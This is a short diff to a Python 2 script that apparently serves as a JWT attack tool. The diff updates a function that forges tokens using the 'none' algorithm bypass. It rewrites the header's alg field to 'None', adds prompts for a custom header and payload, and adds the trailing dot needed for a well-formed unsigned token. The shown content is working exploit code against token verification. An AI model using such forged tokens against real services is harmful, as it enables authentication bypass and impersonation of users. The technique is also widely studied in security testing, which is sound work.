@@ -16,12 +16,18 @@ def processTheNoneToken(token):
     payload=base64.b64decode(verify_Padding(token.split('.')[1]))
     print "\nDecoded Header value is : "+header
     print "Decode Payload value is : "+payload
-    header=re.sub('"alg":".{5}"','"alg":"none"',header)
+    header=re.sub('"alg":".{5}"','"alg":"None"',header)
     print "\nNew header value with none algorithm:"
     print header
+
+    modify_response=raw_input("\nModify Header? (y/n): ")
+    if modify_response == 'y':
+        header=raw_input("Enter your header with 'alg' set to 'None': ")
+        print "Header set to: " + header
+    payload=raw_input("Enter your payload: ")
     base64header = base64.b64encode(header).rstrip('=')
     base64payload = base64.b64encode(payload).rstrip('=')
-    finaljwt = base64header + '.' + base64payload
+    finaljwt = base64header + '.' + base64payload + "."
     print("\nSuccessfully encoded Token: \n" + finaljwt)
 
 def main():
